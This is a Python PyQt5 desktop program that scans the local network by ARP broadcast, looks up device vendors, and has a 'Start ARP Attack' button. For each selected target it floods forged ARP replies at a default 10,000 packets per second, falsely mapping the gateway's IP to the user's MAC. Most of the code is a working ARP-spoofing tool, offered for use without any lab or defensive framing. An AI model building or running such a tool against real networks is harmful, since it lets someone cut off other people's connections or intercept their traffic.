import sys
import requests
import threading
from PyQt5.QtWidgets import (
    QApplication,
    QWidget,
    QPushButton,
    QLabel,
    QVBoxLayout,
    QListWidget,
    QLineEdit,
    QMessageBox,
    QListWidgetItem,
    QAbstractItemView,
    QProgressDialog,
    QDesktopWidget,
    QHBoxLayout,
    QScrollBar,
    QCheckBox,
    QSlider,
    QSpacerItem,
    QSizePolicy
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QPropertyAnimation, QSize, QEasingCurve, QTimer
import socket
import ipaddress
import netifaces
from scapy.all import Ether, ARP, srp, sendp

class NetworkScanner(QThread):
    update_status = pyqtSignal(str)
    found_device = pyqtSignal(str, str, str)  # Signal to send IP, MAC, Manufacturer
    error_occurred = pyqtSignal(str)
    finished_scanning = pyqtSignal()  # Signal to indicate scanning is finished

    def __init__(self, scanned_devices):
        super().__init__()
        self.scanned_devices = scanned_devices  # Store previously scanned devices

    def run(self):
        try:
            self.update_status.emit("Scanning Network...")
            gateway_ip, _ = getGateWayIp_Mac()
            network = str(ipaddress.IPv4Network(gateway_ip + '/24', strict=False))
            query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)

            # Send ARP requests and process responses
            for _, received in srp(query, timeout=2, verbose=0)[0]:
                ip = received.psrc
                mac = received.hwsrc
                manufacturer = get_manufacturer(mac)

                # Skip if this device has already been scanned
                if ip not in self.scanned_devices:
                    self.scanned_devices.add(ip)
                    self.found_device.emit(ip, mac, manufacturer)

            self.update_status.emit("Scanning complete.")
            self.finished_scanning.emit()
        except Exception as e:
            self.error_occurred.emit(f"Failed to scan network: {str(e)}")

class NetworkToolGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.scanned_devices = set()
        self.language = "English"  # 设置默认语言为English
        self.initUI()
        self.attack_threads = []
        self.stop_attack_event = threading.Event()
        self.animation = None  # 初始化动画对象
        self.is_scanning = False  # 增加一个标志来判断是否处于扫描状态
        self.attack_dialog = None  # 初始化 attack_dialog 属性

    def initUI(self):
        self.setWindowTitle("Network Tool")
        self.setFixedHeight(1000)  # 固定高度为1000

        layout = QVBoxLayout()

        # Horizontal layout for "Always on Top" checkbox and language switch
        top_layout = QHBoxLayout()

        # Add "Always on Top" checkbox with label before the checkbox
        self.always_on_top_label = QLabel("Always on Top", self)
        self.always_on_top_checkbox = QCheckBox(self)
        self.always_on_top_checkbox.stateChanged.connect(self.toggle_always_on_top)
        top_layout.addWidget(self.always_on_top_label)
        top_layout.addWidget(self.always_on_top_checkbox)

        # Add a spacer to create space between "Always on Top" and language switch
        top_layout.addSpacerItem(QSpacerItem(20, 0, QSizePolicy.Expanding, QSizePolicy.Minimum))

        # Add language toggle switch next to "Always on Top" checkbox with reduced distance
        self.language_switch = QSlider(Qt.Horizontal, self)
        self.language_switch.setMinimum(0)
        self.language_switch.setMaximum(1)
        self.language_switch.setValue(0)
        self.language_switch.setTickPosition(QSlider.TicksBelow)
        self.language_switch.setTickInterval(1)
        self.language_switch.valueChanged.connect(self.toggle_language)

        # Add labels and spacers around the language switch
        top_layout.addWidget(QLabel("English", self))
        top_layout.addSpacerItem(QSpacerItem(10, 0, QSizePolicy.Minimum, QSizePolicy.Minimum))  # Reduce space between languages
        top_layout.addWidget(self.language_switch)
        top_layout.addSpacerItem(QSpacerItem(10, 0, QSizePolicy.Minimum, QSizePolicy.Minimum))
        top_layout.addWidget(QLabel("简体中文", self))

        # Add another spacer to push the entire layout to the right
        top_layout.addSpacerItem(QSpacerItem(20, 0, QSizePolicy.Expanding, QSizePolicy.Minimum))

        layout.addLayout(top_layout)

        self.scan_button = QPushButton("Scan Network", self)
        self.scan_button.clicked.connect(self.scan_network)
        layout.addWidget(self.scan_button)

        self.ip_list = QListWidget(self)
        self.ip_list.setSelectionMode(QAbstractItemView.ExtendedSelection)
        self.ip_list.itemSelectionChanged.connect(self.update_target_indices)
        layout.addWidget(self.ip_list)

        self.label_indices = QLabel("Target indices:", self)
        self.input_indices = QLineEdit(self)
        self.input_indices.textChanged.connect(self.update_selection_from_indices)

        indices_layout = QHBoxLayout()
        indices_layout.addWidget(self.label_indices)
        indices_layout.addWidget(self.input_indices)
        layout.addLayout(indices_layout)

        self.label_packets = QLabel("Packets per second:", self)
        self.input_packets = QLineEdit(self)
        self.input_packets.setText("10000")
        self.input_packets.textChanged.connect(self.check_packets_input)
        layout.addWidget(self.label_packets)
        layout.addWidget(self.input_packets)

        self.attack_button = QPushButton("Start ARP Attack", self)
        self.attack_button.setEnabled(False)  # Initially disabled
        self.attack_button.clicked.connect(self.start_arp_attack)
        layout.addWidget(self.attack_button)

        self.setLayout(layout)

        # Set initial window size
        self.resize(600, 300)
        self.adjust_window_size()

    def toggle_language(self, value):
        """Toggle the language between English and Simplified Chinese."""
        if value == 0:
            self.language = "English"
            self.always_on_top_label.setText("Always on Top")
            self.scan_button.setText("Scan Network")
            self.label_indices.setText("Target indices:")
            self.label_packets.setText("Packets per second:")
            self.attack_button.setText("Start ARP Attack")
        else:
            self.language = "简体中文"
            self.always_on_top_label.setText("始终在顶层")
            self.scan_button.setText("扫描网络")
            self.label_indices.setText("目标索引:")
            self.label_packets.setText("每秒发送包数:")
            self.attack_button.setText("开始ARP攻击")

    def toggle_always_on_top(self, state):
        """Toggle the always-on-top state of the window."""
        if state == Qt.Checked:
            self.setWindowFlags(self.windowFlags() | Qt.WindowStaysOnTopHint)
        else:
            self.setWindowFlags(self.windowFlags() & ~Qt.WindowStaysOnTopHint)
        self.show()

    def check_packets_input(self):
        """Enable attack button only if valid input is provided and there are targets selected."""
        text = self.input_packets.text()
        self.update_attack_button()

    def update_attack_button(self):
        """Update the state of the attack button."""
        text = self.input_packets.text()
        has_valid_packet_input = text.isdigit() and int(text) > 0
        has_targets_selected = len(self.input_indices.text().split()) > 0
        self.attack_button.setEnabled(has_valid_packet_input and has_targets_selected)

    def scan_network(self):
        self.is_scanning = True  # 标志处于扫描状态
        self.scanning_dialog = QProgressDialog(self)
        self.scanning_dialog.setWindowTitle("Processing")
        self.scanning_dialog.setLabelText("Scanning Network...")
        self.scanning_dialog.setCancelButtonText("Cancel")
        self.scanning_dialog.setRange(0, 0)
        self.scanning_dialog.setWindowModality(Qt.ApplicationModal)
        self.scanning_dialog.setMinimumWidth(300)

        if self.always_on_top_checkbox.isChecked():
            self.scanning_dialog.setWindowFlags(self.scanning_dialog.windowFlags() | Qt.WindowStaysOnTopHint)
        self.scanning_dialog.show()

        self.user_canceled = False
        self.scanning_dialog.canceled.connect(self.cancel_scan)

        # Start the network scanning in a separate thread
        self.network_scanner = NetworkScanner(self.scanned_devices)
        self.network_scanner.update_status.connect(self.handle_update_status)
        self.network_scanner.found_device.connect(self.add_device_to_list)
        self.network_scanner.error_occurred.connect(self.on_scan_error)
        self.network_scanner.finished_scanning.connect(self.finish_scan)
        self.network_scanner.start()

    def handle_update_status(self, status):
        if status == "Scanning complete.":
            self.scanning_dialog.close()
        else:
            self.scanning_dialog.setLabelText(status)

    def cancel_scan(self):
        if self.network_scanner.isRunning():
            self.network_scanner.terminate()
            self.user_canceled = True
        self.scanning_dialog.close()
        self.finish_scan()  # Ensure UI is reset

    def finish_scan(self):
        self.is_scanning = False  # 结束扫描状态
        self.scanning_dialog.close()
        self.adjust_window_size()

    def add_device_to_list(self, ip, mac, manufacturer):
        # Check for duplicates in the existing list
        existing_ips = [self.ip_list.item(i).text().split()[1] for i in range(self.ip_list.count())]
        if ip in existing_ips:
            return

        index = self.ip_list.count() + 1  # Add sequence number
        item_text = f"[{index}] {ip}\t{mac}   ({manufacturer})"
        item = QListWidgetItem(item_text)
        self.ip_list.addItem(item)

        self.ip_list.verticalScrollBar().setValue(self.ip_list.verticalScrollBar().maximum())

        self.remove_duplicates_and_update_indices()
        self.adjust_window_size()

    def smooth_scroll_to_bottom(self):
        scroll_bar = self.ip_list.verticalScrollBar()
        animation = QPropertyAnimation(scroll_bar, b"value")
        animation.setDuration(300)
        animation.setStartValue(scroll_bar.value())
        animation.setEndValue(scroll_bar.maximum())
        animation.setEasingCurve(QEasingCurve.OutCubic)
        animation.start()

    def remove_duplicates_and_update_indices(self):
        ips = {}
        items_to_remove = []

        # Identify duplicates
        for i in range(self.ip_list.count()):
            ip = self.ip_list.item(i).text().split()[1]
            if ip in ips:
                items_to_remove.append(i)
            else:
                ips[ip] = i

        # Remove duplicates and update indices
        offset = 0
        for i in items_to_remove:
            self.ip_list.takeItem(i - offset)
            offset += 1

        # Update indices to ensure they are sequential
        for i in range(self.ip_list.count()):
            text_parts = self.ip_list.item(i).text().split(' ', 1)
            text_parts[0] = f"[{i + 1}]"
            self.ip_list.item(i).setText(' '.join(text_parts))

    def on_scan_error(self, message):
        self.scanning_dialog.close()
        QMessageBox.critical(self, "Error", message)

    def update_target_indices(self):
        """Update the target indices input field based on selected list items, sorted in numerical order."""
        selected_indices = sorted(
            int(item.text().split(']')[0][1:]) for item in self.ip_list.selectedItems()
        )
        self.input_indices.blockSignals(True)  # Prevent recursion
        self.input_indices.setText(' '.join(map(str, selected_indices)))
        self.input_indices.blockSignals(False)
        self.update_attack_button()

    def update_selection_from_indices(self):
        """Update the list selection based on the target indices input field, ensuring sorted order."""
        try:
            indices = sorted(int(i) - 1 for i in self.input_indices.text().split() if i.isdigit())
            self.ip_list.blockSignals(True)  # Prevent recursion
            self.ip_list.clearSelection()
            for index in indices:
                if 0 <= index < self.ip_list.count():
                    self.ip_list.item(index).setSelected(True)
            self.ip_list.blockSignals(False)
            self.update_attack_button()
        except ValueError:
            pass  # Ignore invalid input

    def start_arp_attack(self):
        selected_items = self.ip_list.selectedItems()
        if not selected_items:
            QMessageBox.warning(self, "No Targets Selected", "Please select at least one target to attack.")
            return

        packets_per_sec = int(self.input_packets.text())

        # Ensure we are using a fresh scan list
        hosts = [(item.text().split()[1], item.text().split()[2]) for item in self.ip_list.findItems('*', Qt.MatchWildcard)]
        selected_targets = []
        for item in selected_items:
            try:
                index = self.ip_list.row(item)
                ip, mac = hosts[index]
                selected_targets.append((ip, mac.split(" ")[0]))
            except IndexError:
                QMessageBox.warning(self, "Error", "Selected index out of range.")

        my_ip, my_mac = getMyIp_Mac()
        gateway_ip, _ = getGateWayIp_Mac()

        # Use a dialog to indicate the attack is ongoing
        self.attack_dialog = QProgressDialog(self)
        self.attack_dialog.setWindowTitle("ARP Attack Running")
        self.attack_dialog.setLabelText("Sending ARP packets...")
        self.attack_dialog.setCancelButtonText("Stop Attack")
        self.attack_dialog.setRange(0, 0)
        self.attack_dialog.setWindowModality(Qt.ApplicationModal)
        self.attack_dialog.setMinimumWidth(300)

        if self.always_on_top_checkbox.isChecked():
            self.attack_dialog.setWindowFlags(self.attack_dialog.windowFlags() | Qt.WindowStaysOnTopHint)
        self.attack_dialog.show()

        self.attack_dialog.canceled.connect(self.cancel_attack)

        # Reset stop event and start the attack in separate threads
        self.stop_attack_event.clear()
        self.attack_threads = [
            threading.Thread(target=self.run_attack, args=(my_mac, gateway_ip, target, packets_per_sec))
            for target in selected_targets
        ]

        for thread in self.attack_threads:
            thread.start()

    def run_attack(self, my_mac, gateway_ip, target, pkt_per_sec):
        try:
            target_ip, target_mac = target
            sendpacket(my_mac, gateway_ip, target_ip, target_mac, pkt_per_sec, self.stop_attack_event)
        except Exception as e:
            self.on_attack_error(str(e))

    def cancel_attack(self):
        self.stop_attack_event.set()  # Signal all threads to stop
        self.attack_dialog.close()
        QTimer.singleShot(100, self.check_threads_status)  # 在100ms后检查线程状态
    
    def check_threads_status(self):
        all_threads_stopped = all(not thread.is_alive() for thread in self.attack_threads)
        
        if all_threads_stopped:
            # 如果所有线程都已停止
            self.attack_dialog.close()
        else:
            # 如果还有线程在运行，继续检查
            QTimer.singleShot(100, self.check_threads_status)

    def closeEvent(self, event):
        """Ensure all threads are terminated when the window is closed."""
        if self.attack_dialog is not None:
            self.cancel_attack()
        event.accept()

    def adjust_window_size(self):
        # 获取屏幕尺寸
        screen = QDesktopWidget().availableGeometry(self)  # Use availableGeometry to exclude taskbar
        screen_width = screen.width()

        if self.ip_list.count() > 0:
            # 计算列表项的最大宽度
            max_width = max(
                self.fontMetrics().horizontalAdvance(item.text()) 
                for item in self.ip_list.findItems('*', Qt.MatchWildcard)
            )
            
            # 获取滚动条宽度和填充
            scrollbar_width = self.style().pixelMetric(QApplication.style().PM_ScrollBarExtent)
            padding = 30

            # 计算窗口的新宽度
            new_width = min(max_width + scrollbar_width + padding, screen_width)

            # 使用 QPropertyAnimation 进行窗口大小的平滑动画
            self.animate_resize(new_width, self.height())

    def animate_resize(self, target_width, target_height):
        # 创建动画对象
        self.animation = QPropertyAnimation(self, b"size")
        self.animation.setDuration(200)  # 设置动画持续时间，单位为毫秒
        self.animation.setStartValue(self.size())
        self.animation.setEndValue(QSize(target_width, target_height))
        self.animation.start()

def get_manufacturer(mac_address):
    mac_address = mac_address.replace(":", "").replace("-", "").upper()
    url = f"https://api.macvendors.com/{mac_address}"

    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown"
    except requests.RequestException:
        return "Unknown"

def sendpacket(my_mac, gateway_ip, target_ip, target_mac, count, stop_event):
    ether = Ether()
    ether.src = my_mac
    ether.dst = target_mac

    arp = ARP()
    arp.psrc = gateway_ip
    arp.hwsrc = my_mac
    arp.pdst = target_ip
    arp.hwdst = target_mac
    arp.op = 2

    packet = ether / arp
    while not stop_event.is_set():  # Check the event to see if we should stop
        sendp(packet, count=count, inter=1.0/count, verbose=False)

def getMyIp_Mac():
    myhostname = socket.gethostname()
    myip = socket.gethostbyname(myhostname)
    return myip, getHostMac(myip)

def getGateWayIp_Mac():
    gateIp = netifaces.gateways()['default'][netifaces.AF_INET][0]
    getGateMac = getHostMac(gateIp)
    return gateIp, getGateMac

def getHostMac(host):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=host)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except:
        return False

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = NetworkToolGUI()
    window.show()
    sys.exit(app.exec_())
